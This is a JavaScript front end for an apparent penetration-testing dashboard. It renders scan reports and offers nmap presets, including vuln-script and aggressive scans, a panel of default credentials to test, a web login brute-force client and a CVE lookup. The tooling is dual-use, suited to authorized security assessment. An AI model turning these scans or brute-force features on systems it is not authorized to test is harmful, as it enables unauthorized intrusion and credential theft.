    const ip        = d.state?.target_ip || '—';
    const domain    = d.state?.target_domain || '—';
    const toolLabel = {
        'port-scanner': 'Port Scan', dns: 'DNS / WHOIS', subdomains: 'Subdomain Enumeration',
        headers: 'HTTP Header Analysis', dirs: 'Directory Brute Force',
        'web-brute': 'Web Login Brute Force', session: 'Full Session', nmap: 'Nmap Scan',
    }[tool] || tool;

    let body = '';

    // ── Port Scanner ─────────────────────────────────────────────
    if (tool === 'port-scanner' && d.open_ports?.length >= 0) {
        const ports = d.open_ports || [];
        body += statGrid([
            { val: ports.length, label: 'Open Ports', color: ports.length ? 'var(--green)' : 'var(--text-dim)' },
            { val: ip, label: 'Target IP', color: 'var(--accent)' },
            { val: domain || '—', label: 'Domain', color: 'var(--accent)' },
        ]);

        if (ports.length) {
            body += section('Open Ports', `
                <table class="rpt-table">
                    <thead><tr><th>Port</th><th>Service</th><th>Status</th><th>Banner</th></tr></thead>
                    <tbody>
                        ${ports.map(p => `<tr class="rpt-finding-row">
                            <td>${p.port}</td>
                            <td>${esc(p.service)}</td>
                            <td><span class="rpt-badge rpt-badge-open">OPEN</span></td>
                            <td style="color:var(--text-muted);font-size:12px">${esc(p.banner || '—')}</td>
                        </tr>`).join('')}
                    </tbody>
                </table>`);
        } else {
            body += `<div class="rpt-note">No open ports found in this scan range.</div>`;
        }
    }

    // ── HTTP Headers ─────────────────────────────────────────────
    else if (tool === 'headers' && d.headers_data) {
        const hd = d.headers_data;
        body += statGrid([
            { val: hd.grade || '?', label: 'Security Grade', color: gradeColor(hd.grade) },
            { val: `${hd.score}/${hd.max_score}`, label: 'Headers Present', color: 'var(--accent)' },
            { val: hd.status_code || '—', label: 'HTTP Status', color: 'var(--text)' },
        ]);

        if (hd.headers?.length) {
            body += section('Security Headers', `
                <table class="rpt-table">
                    <thead><tr><th>Header</th><th>Status</th><th>Value</th><th>Recommendation</th></tr></thead>
                    <tbody>
                        ${hd.headers.map(h => `<tr>
                            <td style="font-family:var(--mono);font-weight:600">${esc(h.header)}</td>
                            <td><span class="rpt-badge rpt-badge-${h.status}">${h.status.toUpperCase()}</span></td>
                            <td style="font-family:var(--mono);font-size:12px;color:var(--text-muted)">${esc(h.value || '—')}</td>
                            <td style="font-size:12px;color:var(--text-muted)">${esc(h.recommended)}</td>
                        </tr>`).join('')}
                    </tbody>
                </table>`);
        }
    }

    // ── DNS ───────────────────────────────────────────────────────
    else if (tool === 'dns' && d.dns_data) {
        const dd = d.dns_data;
        body += statGrid([
            { val: dd.ip || '—',           label: 'IP Address',   color: 'var(--accent)' },
            { val: dd.reverse_dns || '—',  label: 'Reverse DNS',  color: 'var(--text)' },
            { val: (dd.mx_records?.length || 0), label: 'MX Records', color: 'var(--text)' },
        ]);

        const rows = [
            ['IP Address', dd.ip],
            ['Reverse DNS', dd.reverse_dns],
            ['All IPs', dd.all_ips?.join(', ')],
            ['MX Records', dd.mx_records?.join(', ')],
            ['NS Records', dd.ns_records?.join(', ')],
            ['Registrar', dd.whois?.registrar],
            ['Organisation', dd.whois?.org],
            ['Country', dd.whois?.country],
            ['Created', dd.whois?.creation_date],
            ['Expires', dd.whois?.expiration_date],
            ['Name Servers', dd.whois?.name_servers?.join(', ')],
        ].filter(([, v]) => v);

        body += section('DNS & WHOIS Details', `
            <table class="rpt-table">
                <tbody>
                    ${rows.map(([k, v]) => `<tr><td style="min-width:150px;font-weight:600;color:var(--text-muted);font-size:13px">${k}</td><td style="font-family:var(--mono)">${esc(v)}</td></tr>`).join('')}
                </tbody>
            </table>`);
    }

    // ── Subdomains ────────────────────────────────────────────────
    else if (tool === 'subdomains' && d.subdomain_data) {
        const found = d.subdomain_data || [];
        body += statGrid([
            { val: found.length, label: 'Subdomains Found', color: found.length ? 'var(--green)' : 'var(--text-dim)' },
            { val: domain || '—', label: 'Target Domain', color: 'var(--accent)' },
        ]);

        if (found.length) {
            body += section('Discovered Subdomains', `
                <table class="rpt-table">
                    <thead><tr><th>Subdomain</th><th>IP Address</th></tr></thead>
                    <tbody>
                        ${found.map(s => `<tr>
                            <td style="font-family:var(--mono);font-weight:600">${esc(s.subdomain)}</td>
                            <td style="font-family:var(--mono);color:var(--accent)">${esc(s.ip)}</td>
                        </tr>`).join('')}
                    </tbody>
                </table>`);
        }
    }

    // ── Dir Brute ─────────────────────────────────────────────────
    else if (tool === 'dirs' && d.dir_data) {
        const found = d.dir_data || [];
        const c200  = found.filter(f => f.status >= 200 && f.status < 300).length;
        const c403  = found.filter(f => f.status === 403).length;
        const c301  = found.filter(f => [301,302,307,308].includes(f.status)).length;

        body += statGrid([
            { val: found.length, label: 'Paths Found',   color: found.length ? 'var(--green)' : 'var(--text-dim)' },
            { val: c200,         label: '200 OK',         color: 'var(--green)' },
            { val: c301,         label: 'Redirects',      color: 'var(--accent)' },
            { val: c403,         label: '403 Forbidden',  color: 'var(--amber)' },
        ]);

        if (found.length) {
            body += section('Discovered Paths', `
                <table class="rpt-table">
                    <thead><tr><th>Status</th><th>URL</th><th>Size</th></tr></thead>
                    <tbody>
                        ${found.map(f => {
                            const cls = f.status === 200 ? 'open' : f.status === 403 ? 'high' : f.status >= 500 ? 'critical' : 'low';
                            return `<tr>
                                <td><span class="rpt-badge rpt-badge-${cls}">${f.status}</span></td>
                                <td style="font-family:var(--mono);font-size:13px">${esc(f.url)}</td>
                                <td style="color:var(--text-muted)">${fmtSize(f.size)}</td>
                            </tr>`;
                        }).join('')}
                    </tbody>
                </table>`);
        }
    }

    // ── Session (save-all) ────────────────────────────────────────
    else if (tool === 'session') {
        const ports = d.open_ports || [];
        const subs  = d.subdomains || [];
        body += statGrid([
            { val: ports.length,  label: 'Open Ports',   color: ports.length ? 'var(--green)' : 'var(--text-dim)' },
            { val: subs.length,   label: 'Subdomains',   color: subs.length  ? 'var(--accent)' : 'var(--text-dim)' },
            { val: d.dns_data     ? 'Yes' : 'No', label: 'DNS Data',     color: d.dns_data     ? 'var(--green)' : 'var(--text-dim)' },
            { val: d.headers_data ? (d.headers_data.grade || '?') : 'No', label: 'Header Grade', color: d.headers_data ? gradeColor(d.headers_data.grade) : 'var(--text-dim)' },
        ]);
        if (ports.length) {
            body += section('Open Ports', `
                <table class="rpt-table">
                    <thead><tr><th>Port</th><th>Service</th><th>Status</th><th>Banner</th></tr></thead>
                    <tbody>${ports.map(p => `<tr class="rpt-finding-row">
                        <td>${p.port}</td><td>${esc(p.service)}</td>
                        <td><span class="rpt-badge rpt-badge-open">OPEN</span></td>
                        <td style="color:var(--text-muted);font-size:12px">${esc(p.banner || '—')}</td>
                    </tr>`).join('')}</tbody>
                </table>`);
        }
        if (subs.length) {
            body += section('Subdomains', `
                <table class="rpt-table">
                    <thead><tr><th>Subdomain</th><th>IP</th></tr></thead>
                    <tbody>${subs.map(s => `<tr>
                        <td style="font-family:var(--mono);font-weight:600">${esc(s.subdomain)}</td>
                        <td style="font-family:var(--mono);color:var(--accent)">${esc(s.ip)}</td>
                    </tr>`).join('')}</tbody>
                </table>`);
        }
        if (d.dns_data) {
            const dd = d.dns_data;
            const rows = [
                ['IP Address', dd.ip], ['Reverse DNS', dd.reverse_dns],
                ['MX Records', dd.mx_records?.join(', ')], ['NS Records', dd.ns_records?.join(', ')],
                ['Registrar', dd.whois?.registrar], ['Organisation', dd.whois?.org],
                ['Country', dd.whois?.country], ['Expires', dd.whois?.expiration_date],
            ].filter(([, v]) => v);
            if (rows.length) body += section('DNS / WHOIS', `
                <table class="rpt-table"><tbody>
                    ${rows.map(([k, v]) => `<tr>
                        <td style="min-width:140px;font-weight:600;color:var(--text-muted);font-size:13px">${k}</td>
                        <td style="font-family:var(--mono)">${esc(v)}</td>
                    </tr>`).join('')}
                </tbody></table>`);
        }
        if (d.headers_data) {
            const hd = d.headers_data;
            body += section('HTTP Security Headers', `
                <div style="margin-bottom:10px;font-size:14px">
                    Grade: <span style="font-weight:700;color:${gradeColor(hd.grade)}">${hd.grade}</span>
                    &nbsp;&nbsp; Score: <span style="color:var(--accent)">${hd.score}/${hd.max_score}</span>
                </div>
                <table class="rpt-table">
                    <thead><tr><th>Header</th><th>Status</th><th>Value</th><th>Recommendation</th></tr></thead>
                    <tbody>${(hd.headers || []).map(h => `<tr>
                        <td style="font-family:var(--mono);font-weight:600">${esc(h.header)}</td>
                        <td><span class="rpt-badge rpt-badge-${h.status}">${h.status.toUpperCase()}</span></td>
                        <td style="font-family:var(--mono);font-size:12px;color:var(--text-muted)">${esc(h.value || '—')}</td>
                        <td style="font-size:12px;color:var(--text-muted)">${esc(h.recommended || '')}</td>
                    </tr>`).join('')}</tbody>
                </table>`);
        }
        if (d.dir_data?.length) {
            const found = d.dir_data;
            body += section('Directory Findings', `
                <table class="rpt-table">
                    <thead><tr><th>Status</th><th>URL</th><th>Size</th></tr></thead>
                    <tbody>${found.map(f => {
                        const cls = f.status === 200 ? 'open' : f.status === 403 ? 'high' : f.status >= 500 ? 'critical' : 'low';
                        return `<tr>
                            <td><span class="rpt-badge rpt-badge-${cls}">${f.status}</span></td>
                            <td style="font-family:var(--mono);font-size:13px">${esc(f.url)}</td>
                            <td style="color:var(--text-muted)">${fmtSize(f.size)}</td>
                        </tr>`;
                    }).join('')}</tbody>
                </table>`);
        }
        if (!ports.length && !subs.length && !d.dns_data && !d.headers_data && !d.dir_data?.length) {
            body += `<div class="rpt-note">No scan data was captured in this session.</div>`;
        }
    }

    // ── Nmap ─────────────────────────────────────────────────────
    else if (tool === 'nmap') {
        body += statGrid([
            { val: d.target || ip, label: 'Target',  color: 'var(--accent)' },
            { val: d.command?.split(' ').slice(1,3).join(' ') || '—', label: 'Flags', color: 'var(--text)' },
        ]);
        body += section('Command', `<div class="vuln-scripts" style="padding:8px 10px">${esc(d.command || '—')}</div>`);
        if (d.output) {
            body += section('Output', `<pre class="report-json" style="max-height:500px">${esc(d.output)}</pre>`);
        }
    }

    // ── Fallback ──────────────────────────────────────────────────
    else {
        body += `<div class="rpt-note">Raw report data:</div>
            <pre class="report-json">${esc(JSON.stringify(d, null, 2))}</pre>`;
    }

    return `<div class="rpt-wrap">
        <div class="rpt-header">
            <div class="rpt-title">${toolLabel} Report</div>
            <div class="rpt-meta">
                <span>📅 ${ts}</span>
                ${ip !== '—' ? `<span>🎯 ${esc(ip)}</span>` : ''}
                ${domain && domain !== '—' ? `<span>🌐 ${esc(domain)}</span>` : ''}
            </div>
        </div>
        ${body}
    </div>`;
}

function statGrid(stats) {
    return `<div class="rpt-summary-grid">${stats.map(s => `
        <div class="rpt-stat">
            <div class="rpt-stat-val" style="color:${s.color}">${esc(String(s.val))}</div>
            <div class="rpt-stat-label">${esc(s.label)}</div>
        </div>`).join('')}</div>`;
}

function section(title, content) {
    return `<div class="rpt-section">
        <div class="rpt-section-title">${title}</div>
        ${content}
    </div>`;
}

function gradeColor(g) {
    return { A: 'var(--green)', B: 'var(--accent)', C: '#cca800', D: 'var(--amber)', F: 'var(--red)' }[g] || 'var(--text)';
}

async function saveReport(tool) {
    const structured = {
        tool,
        timestamp: new Date().toISOString(),
        state: { target_ip: appState.target_ip, target_domain: appState.target_domain },
    };

    // Capture structured data per tool so reports render properly
    if (tool === 'port-scanner') structured.open_ports = appState.open_ports || [];
    if (tool === 'subdomains')   structured.subdomain_data = appState.subdomains || [];
    if (tool === 'dns' && window._lastDnsData)        structured.dns_data      = window._lastDnsData;
    if (tool === 'headers' && window._lastHeaderData) structured.headers_data  = window._lastHeaderData;
    if (tool === 'dirs' && window._lastDirData)       structured.dir_data      = window._lastDirData;
    if (tool === 'sqli' && window._lastSqliData) {
        structured.findings   = window._lastSqliData.findings || [];
        structured.severity   = window._lastSqliData.severity || 'none';
        structured.parameter  = window._lastSqliData.parameter || '';
    }
    if (tool === 'ssl' && window._lastSSLData) structured.ssl_data = window._lastSSLData;

    try {
        await post('/api/reports/save', structured);
        logEvent('REPORTS', `Saved ${tool} report for ${structured.state.target_ip || structured.state.target_domain || '?'}`);
        toast('Report saved');
    } catch (e) {
        toast('Save failed');
    }
}

// ─── NMAP SECTION ───────────────────────────────────────────────────
let nmapSSE = null;

async function buildNmapSection(ip, openPorts) {
    const section = el('nmap-section');
    if (!section) return;
    section.classList.remove('hidden');

    const ports = openPorts.map(p => p.port).join(',');
    const presets = [
        { label: 'Version Detect',  cmd: `nmap -sV -p ${ports} ${ip}` },
        { label: 'Default Scripts', cmd: `nmap -sV -sC -p ${ports} ${ip}` },
        { label: 'Vuln Scripts',    cmd: `nmap -sV --script vuln -p ${ports} ${ip}` },
        { label: 'OS Detection',    cmd: `nmap -O -sV -p ${ports} ${ip}` },
        { label: 'Aggressive',      cmd: `nmap -A -p ${ports} ${ip}` },
        { label: 'UDP Scan',        cmd: `nmap -sU --top-ports 20 ${ip}` },
        { label: 'All Ports',       cmd: `nmap -sV -p- ${ip}` },
    ];

    const presetsEl = el('nmap-presets');
    presetsEl.innerHTML = presets.map(p => `
        <div class="nmap-preset-row">
            <span class="nmap-preset-label">${esc(p.label)}</span>
            <span class="nmap-preset-cmd">${esc(p.cmd)}</span>
            <button class="copy-inline" onclick="copyText(${JSON.stringify(p.cmd)})">COPY</button>
            <button class="copy-inline" onclick="useNmapPreset(${JSON.stringify(p.cmd)})">USE</button>
        </div>
    `).join('');

    // Default command in input
    el('nmap-cmd').value = presets[1].cmd;

    // Load custom presets from localStorage
    loadCustomNmapPresets();

    // Check if nmap is available
    try {
        const r = await fetch('/api/nmap/check');
        const d = await r.json();
        const avail = el('nmap-avail');
        if (d.available) {
            avail.textContent = '✓ nmap found';
            avail.style.color = 'var(--green)';
        } else {
            avail.textContent = '✗ nmap not on PATH';
            avail.style.color = 'var(--red)';
        }
    } catch (e) { /* ignore */ }
}

function toggleNmap() {
    const body    = el('nmap-body');
    const chevron = el('nmap-chevron');
    const open    = body.classList.toggle('open');
    chevron.classList.toggle('open', open);
}

function useNmapPreset(cmd) {
    el('nmap-cmd').value = cmd;
    const body = el('nmap-body');
    if (!body.classList.contains('open')) toggleNmap();
    el('nmap-cmd').focus();
}

function runNmap() {
    const cmd = el('nmap-cmd').value.trim();
    if (!cmd) { toast('Enter an nmap command'); return; }
    if (!cmd.toLowerCase().startsWith('nmap ')) { toast('Command must start with nmap'); return; }

    if (nmapSSE) { nmapSSE.close(); nmapSSE = null; }

    logEvent('NMAP', `Run: ${cmd}`);
    const output = el('nmap-output');
    output.classList.add('visible');
    output.textContent = '';
    el('nmap-run-btn').disabled = true;
    el('nmap-save-row').classList.add('hidden');
    el('nmap-md-download').classList.add('hidden');

    const appendLine = (text, cls) => {
        const span = document.createElement('span');
        if (cls) span.className = cls;
        span.textContent = text + '\n';
        output.appendChild(span);
        output.scrollTop = output.scrollHeight;
    };

    appendLine(`$ ${cmd}`, 'nmap-status-inf');

    nmapSSE = new EventSource(`/api/nmap/run?cmd=${encodeURIComponent(cmd)}`);
    nmapSSE.onmessage = e => {
        const d = JSON.parse(e.data);
        if (d.type === 'line') {
            const cls = d.line.includes('open') ? 'nmap-status-ok'
                      : d.line.includes('ERROR') || d.line.includes('FAILED') ? 'nmap-status-err'
                      : '';
            appendLine(d.line, cls);
        } else if (d.type === 'error') {
            appendLine(d.line, 'nmap-status-err');
            el('nmap-run-btn').disabled = false;
            nmapSSE.close(); nmapSSE = null;
        } else if (d.type === 'done') {
            appendLine(`\n[done — exit code ${d.code}]`, d.code === 0 ? 'nmap-status-ok' : 'nmap-status-err');
            logEvent('NMAP', `Complete — exit code ${d.code}: ${cmd}`);
            el('nmap-run-btn').disabled = false;
            nmapSSE.close(); nmapSSE = null;
            el('nmap-save-row').classList.remove('hidden');
        }
    };
    nmapSSE.onerror = () => {
        el('nmap-run-btn').disabled = false;
        nmapSSE.close(); nmapSSE = null;
    };
}

async function saveNmapReport() {
    const output = el('nmap-output') ? el('nmap-output').textContent : '';
    const cmd    = el('nmap-cmd') ? el('nmap-cmd').value : '';
    const data   = {
        tool:      'nmap',
        command:   cmd,
        output:    output,
        target:    appState.target_ip || '',
        timestamp: new Date().toISOString(),
        state:     { target_ip: appState.target_ip, target_domain: appState.target_domain },
    };
    try {
        const r = await post('/api/reports/save-nmap', data);
        if (r.ok) {
            logEvent('REPORTS', `Nmap report saved — ${r.md_file}`);
            toast('Nmap report saved');
            const dlBtn = el('nmap-md-download');
            dlBtn.href = `/api/reports/download/${encodeURIComponent(r.md_file)}`;
            dlBtn.textContent = 'Download .md';
            dlBtn.classList.remove('hidden');
        }
    } catch (e) { toast('Save failed'); }
}

// ─── NMAP CUSTOM PRESETS ────────────────────────────────────────────
function loadCustomNmapPresets() {
    const presets = JSON.parse(localStorage.getItem('ct-nmap-custom-presets') || '[]');
    renderCustomPresets(presets);
}

function renderCustomPresets(presets) {
    const container = el('nmap-custom-presets');
    if (!container) return;
    if (!presets.length) {
        container.innerHTML = '<div class="nmap-custom-empty">No custom presets saved yet.</div>';
        return;
    }
    container.innerHTML = presets.map((p, i) => `
        <div class="nmap-preset-row">
            <span class="nmap-preset-label">${esc(p.label)}</span>
            <span class="nmap-preset-cmd">${esc(p.cmd)}</span>
            <button class="copy-inline" onclick="copyText(${JSON.stringify(p.cmd)})">COPY</button>
            <button class="copy-inline" onclick="useNmapPreset(${JSON.stringify(p.cmd)})">USE</button>
            <button class="copy-inline" style="border-color:rgba(255,68,85,0.35);color:var(--red)" onclick="removeCustomPreset(${i})">✕</button>
        </div>
    `).join('');
}

function addNmapCustomPreset() {
    const cmd   = (el('nmap-cmd') ? el('nmap-cmd').value : '').trim();
    const label = (el('nmap-preset-label') ? el('nmap-preset-label').value : '').trim() || 'Custom';
    if (!cmd) { toast('Enter a command first'); return; }
    const presets = JSON.parse(localStorage.getItem('ct-nmap-custom-presets') || '[]');
    presets.push({ label, cmd });
    localStorage.setItem('ct-nmap-custom-presets', JSON.stringify(presets));
    if (el('nmap-preset-label')) el('nmap-preset-label').value = '';
    renderCustomPresets(presets);
    toast('Preset saved');
}

function removeCustomPreset(index) {
    const presets = JSON.parse(localStorage.getItem('ct-nmap-custom-presets') || '[]');
    presets.splice(index, 1);
    localStorage.setItem('ct-nmap-custom-presets', JSON.stringify(presets));
    renderCustomPresets(presets);
    toast('Preset removed');
}

// ─── VULN SCANNER ───────────────────────────────────────────────────
async function toggleVuln(port, service) {
    const panel    = el(`vuln-panel-${port}`);
    const portSpan = el(`vuln-btn-${port}`);
    if (!panel) return;

    if (!panel.classList.contains('hidden')) {
        panel.classList.add('hidden');
        portSpan.classList.remove('active');
        return;
    }

    portSpan.classList.add('active');
    panel.classList.remove('hidden');
    panel.innerHTML = '<div class="vuln-panel sev-info"><div class="log-info">Loading vulnerability data...</div></div>';

    logEvent('VULN-SCAN', `Check port ${port}/${service} on ${appState.target_ip || '?'}`);
    try {
        const ip = appState.target_ip || '';
        const d  = await post('/api/vulns/check', { ip, port, service, live: false });
        panel.innerHTML = renderVulnPanel(d);
    } catch (e) {
        panel.innerHTML = `<div class="vuln-panel sev-info"><div class="log-error">Check failed: ${esc(e.message)}</div></div>`;
    } finally {
        portSpan.classList.remove('active');
    }
}

async function runLiveCheck(port, service) {
    const panel = el(`vuln-panel-${port}`);
    const btn   = el(`live-btn-${port}`);
    if (!panel) return;

    if (btn) { btn.disabled = true; btn.textContent = 'Running...'; }

    logEvent('VULN-SCAN', `Live check port ${port}/${service} on ${appState.target_ip || '?'}`);
    try {
        const ip = appState.target_ip || '';
        const d  = await post('/api/vulns/check', { ip, port, service, live: true });
        panel.innerHTML = renderVulnPanel(d, true);
    } catch (e) {
        if (btn) { btn.disabled = false; btn.textContent = 'Run Live Check'; }
    }
}

function renderVulnPanel(d, isLive = false) {
    const sev   = d.severity || 'info';
    const match = d.service_match !== false;
    let html    = `<div class="vuln-panel sev-${sev}">`;

    // Header with live check button
    html += `<div class="vuln-header">
        <span class="sev-badge sev-badge-${sev}">${sev}</span>
        <span style="color:var(--text);font-weight:700">${esc(d.service)} / Port ${d.port}</span>
        ${d.ip ? `<span style="color:var(--text-dim)">${esc(d.ip)}</span>` : ''}
        ${d.has_active_check ? `<button class="vuln-live-btn" id="live-btn-${d.port}" onclick="runLiveCheck(${d.port}, '${esc(d.service)}')">${isLive ? '✓ Live Check Done' : 'Run Live Check'}</button>` : ''}
    </div>`;

    // Banner
    if (d.banner) {
        html += `<div class="vuln-banner">Banner: ${esc(d.banner)}</div>`;
    }

    // Service mismatch warning
    if (d.match_warning) {
        html += `<div class="vuln-match-warn">⚠ ${esc(d.match_warning)}</div>`;
    }

    // Live check results (only shown after live check)
    if (d.active_findings && d.active_findings.length) {
        html += `<div class="vuln-section-title">Live Check Results</div>`;
        d.active_findings.forEach(f => {
            html += `<div class="vuln-active-finding type-${f.type}">${esc(f.msg)}</div>`;
        });
    } else if (isLive) {
        html += `<div class="vuln-section-title">Live Check Results</div>
            <div class="vuln-active-finding type-info">No active issues detected.</div>`;
    }

    // Known attack surface — conditional on service match
    if (d.issues && d.issues.length) {
        html += `<div class="vuln-section-title">Known Attack Surface${!match ? '<span class="warn-badge">May not apply — service mismatch</span>' : ''}</div>`;
        d.issues.forEach(i => {
            html += `<div class="vuln-issue${!match ? ' vuln-issue-muted' : ''}">${esc(i)}</div>`;
        });
    }

    // CVEs — only shown if service matches
    if (d.cves && d.cves.length) {
        if (match) {
            html += `<div class="vuln-section-title">Known CVEs</div>`;
            d.cves.forEach(c => {
                html += `<div class="vuln-cve">
                    <span class="vuln-cve-id vuln-cve-id-${c.severity}">${esc(c.id)}</span>
                    <span class="vuln-cve-desc">${esc(c.description)}</span>
                    <button class="copy-inline" onclick="copyText('${esc(c.id)}')">COPY</button>
                </div>`;
            });
        } else {
            html += `<div class="vuln-section-title">Known CVEs<span class="warn-badge">Service mismatch — verify before using</span></div>`;
            d.cves.forEach(c => {
                html += `<div class="vuln-cve vuln-cve-muted">
                    <span class="vuln-cve-id vuln-cve-id-${c.severity}">${esc(c.id)}</span>
                    <span class="vuln-cve-desc">${esc(c.description)}</span>
                </div>`;
            });
        }
    }

    // Default creds
    if (d.default_creds && d.default_creds.length) {
        html += `<div class="vuln-section-title">Default Credentials to Test</div><div style="padding:4px 0">`;
        d.default_creds.forEach(c => {
            const display = `${c.user || '(blank)'}  /  ${c.pass || '(blank)'}`;
            html += `<span class="vuln-cred" title="Click to copy" onclick="copyText('${esc(c.user)}:${esc(c.pass)}')">${esc(display)}</span>`;
        });
        html += '</div>';
    }

    // Nmap scripts
    if (d.nmap_scripts && d.nmap_scripts.length) {
        const scriptStr  = `nmap -sV --script ${d.nmap_scripts.join(',')} -p ${d.port} ${appState.target_ip || '<target>'}`;
        const scriptJson = JSON.stringify(scriptStr).replace(/"/g, '&quot;');
        html += `<div class="vuln-section-title">Recommended Nmap Scripts</div>
            <div class="vuln-scripts">${esc(scriptStr)}
            <button class="copy-inline" style="margin-left:8px" onclick="copyText(${scriptJson})">COPY</button></div>`;
    }

    // Remediation
    if (d.remediation) {
        html += `<div class="vuln-section-title">Remediation</div>
            <div class="vuln-remediation">${esc(d.remediation)}</div>`;
    }

    html += '</div>';
    return html;
}

// ─── WEB LOGIN BRUTE FORCE ──────────────────────────────────────────
document.getElementById('wb-scan-btn').addEventListener('click', startWebBrute);
document.getElementById('wb-stop-btn').addEventListener('click', stopSSE);

function startWebBrute() {
    const url        = el('wb-url').value.trim();
    const userField  = el('wb-user-field').value.trim() || 'username';
    const passField  = el('wb-pass-field').value.trim() || 'password';
    const username   = el('wb-username').value.trim();
    const proxy      = el('wb-proxy') ? el('wb-proxy').value.trim() : '';
    const customWl   = el('wb-wordlist') ? el('wb-wordlist').value : '';

    if (!url)      { showInputError('wb-url', 'Enter the login page URL'); return; }
    if (!username) { showInputError('wb-username', 'Enter a username to test'); return; }

    logEvent('WEB-BRUTE', `Started brute force on ${url} — username: ${username}`);
    stopSSE();

    const results = el('wb-results');
    results.innerHTML = '';
    el('wb-progress').classList.remove('hidden');
    el('wb-actions').classList.add('hidden');
    el('wb-scan-btn').disabled = true;
    el('wb-stop-btn').classList.remove('hidden');

    const wbStart = Date.now();
    let apiUrl = `/api/web/brute?url=${enc(url)}&user_field=${enc(userField)}&pass_field=${enc(passField)}&username=${enc(username)}`;
    if (proxy)    apiUrl += `&proxy=${enc(proxy)}`;
    if (customWl) apiUrl += `&wordlist=${enc(customWl)}`;

    activeSSE = new EventSource(apiUrl);

    activeSSE.onmessage = e => {
        const d = JSON.parse(e.data);
        if (d.type === 'info') {
            results.insertAdjacentHTML('beforeend', `<div class="log-info">${esc(d.message)}</div>`);
        } else if (d.type === 'found') {
            logEvent('WEB-BRUTE', `FOUND credentials — ${d.username} : ${d.password}`);
            results.insertAdjacentHTML('beforeend', `
                <div class="wb-found">
                    <span class="wb-found-label">FOUND</span>
                    <span class="wb-found-cred">${esc(d.username)} : ${esc(d.password)}</span>
                    <span style="font-size:12px;color:var(--text-muted)">${esc(d.reason)}</span>
                    <button class="copy-inline" onclick="copyText('${esc(d.username)}:${esc(d.password)}')">COPY</button>
                </div>
            `);
            results.scrollTop = results.scrollHeight;
        } else if (d.type === 'progress') {
            // Fix #22: ETA for web brute
            const elapsed = (Date.now() - wbStart) / 1000;
            const rate = d.tried / (elapsed || 0.001);
            const remaining = d.total - d.tried;
            const eta = rate > 0 && remaining > 0 ? Math.round(remaining / rate) : null;
            const etaStr = eta !== null ? ` · ETA ${eta}s` : '';
            setProgress('wb', d.percent, `${d.percent}%  ${d.tried}/${d.total}  current: ${esc(d.current)}${etaStr}`);
        } else if (d.type === 'error') {
            results.insertAdjacentHTML('beforeend', `<div class="log-error">${esc(d.message)}</div>`);
        } else if (d.type === 'complete') {
            setProgress('wb', 100, `Done — ${d.found.length} credential${d.found.length !== 1 ? 's' : ''} found`);
            logEvent('WEB-BRUTE', `Complete — ${d.found.length} credential(s) found on ${url}`);
            el('wb-actions').classList.remove('hidden');
            scanDone('wb');
        } else if (d.type === 'done') {
            scanDone('wb');
        }
    };

    activeSSE.onerror = () => scanDone('wb');
}

// ─── SESSION: CLEAR ALL & SAVE ALL ──────────────────────────────────
function clearAll() {
    showConfirm('Clear all scan results and session data?', () => {
        // Reset state
        Object.assign(appState, { target_ip: '', target_domain: '', target_url: '', open_ports: [], subdomains: [] });
        pushState({ target_ip: '', target_domain: '', target_url: '', open_ports: [], subdomains: [] });

        // Clear result areas
        ['ps-results', 'dns-results', 'sub-results', 'dir-results',
         'hdr-results', 'hash-results', 'enc-results', 'wb-results'].forEach(id => {
            const area = el(id);
            if (area) area.innerHTML = '<div class="results-placeholder">Cleared.</div>';
        });

        // Clear inputs
        ['ps-target', 'dns-target', 'sub-target', 'hdr-url', 'dir-url', 'wb-url',
         'hash-input', 'enc-input', 'wb-username'].forEach(id => {
            const inp = el(id);
            if (inp) inp.value = '';
        });

        // Hide action bars and nmap section
        ['ps-actions', 'dns-actions', 'sub-actions', 'hdr-actions', 'dir-actions', 'wb-actions'].forEach(id => {
            const a = el(id); if (a) a.classList.add('hidden');
        });
        const nmap = el('nmap-section'); if (nmap) nmap.classList.add('hidden');

        // Clear stored data references
        window._lastDnsData = null;
        window._lastHeaderData = null;
        window._lastDirData = null;

        logEvent('SESSION', 'All scan data cleared by user');
        renderStateBar();
        loadHomepage();
        toast('Everything cleared');
    });
}

async function saveAllReport() {
    const structured = {
        tool:      'session',
        timestamp: new Date().toISOString(),
        state:     { target_ip: appState.target_ip, target_domain: appState.target_domain },
        open_ports:     appState.open_ports  || [],
        subdomains:     appState.subdomains  || [],
        dns_data:       window._lastDnsData      || null,
        headers_data:   window._lastHeaderData   || null,
        dir_data:       window._lastDirData      || null,
    };
    try {
        await post('/api/reports/save', structured);
        logEvent('SESSION', `Full session report saved — ${structured.open_ports.length} ports, ${structured.subdomains.length} subdomains`);
        toast('Session report saved');
    } catch (e) { toast('Save failed'); }
}

// ─── CVE SEARCH ─────────────────────────────────────────────────────
document.getElementById('cve-search-btn').addEventListener('click', searchCVE);
document.getElementById('cve-query').addEventListener('keydown', e => { if (e.key === 'Enter') searchCVE(); });

async function searchCVE() {
    const query   = el('cve-query').value.trim();
    const results = el('cve-results');
    if (!query) { toast('Enter a query'); return; }

    results.innerHTML = '<div class="log-info">Searching...</div>';
    logEvent('CVE-SEARCH', `Query: ${query}`);

    try {
        const d = await post('/api/cve/search', { query });
        if (!d.results.length) {
            results.innerHTML = `<div class="results-placeholder">No results for "<b>${esc(query)}</b>"</div>`;
            return;
        }
        results.innerHTML = `<div style="padding:8px 12px;font-family:var(--mono);font-size:12px;color:var(--text-muted);border-bottom:1px solid var(--border-2)">${d.count} result${d.count !== 1 ? 's' : ''} for "<span style="color:var(--accent)">${esc(query)}</span>"</div>`;
        d.results.forEach(r => results.insertAdjacentHTML('beforeend', renderCveCard(r)));
    } catch (e) {
        results.innerHTML = `<div class="log-error">[!] ${esc(e.message)}</div>`;
    }
}

async function cveAll() {
    const results = el('cve-results');
    results.innerHTML = '<div class="log-info">Loading all entries...</div>';
    try {
        const d = await (await fetch('/api/cve/all')).json();
        results.innerHTML = `<div style="padding:8px 12px;font-family:var(--mono);font-size:12px;color:var(--text-muted);border-bottom:1px solid var(--border-2)">${d.count} services — click to expand</div>`;
        d.results.forEach(r => results.insertAdjacentHTML('beforeend', renderCveCard(r)));
    } catch (e) {
        results.innerHTML = `<div class="log-error">[!] ${esc(e.message)}</div>`;
    }
}

function renderCveCard(r) {
    const id = `cve-body-${r.port}`;
    const sevColor = { critical: 'var(--red)', high: 'var(--amber)', medium: '#ccaa00', low: 'var(--green)', info: 'var(--accent)' }[r.severity] || 'var(--accent)';
    let body = '';

    if (r.issues?.length) {
        body += `<div class="cve-section-label">Attack Surface</div>`;
        r.issues.forEach(i => body += `<div class="cve-issue-row">${esc(i)}</div>`);
    }
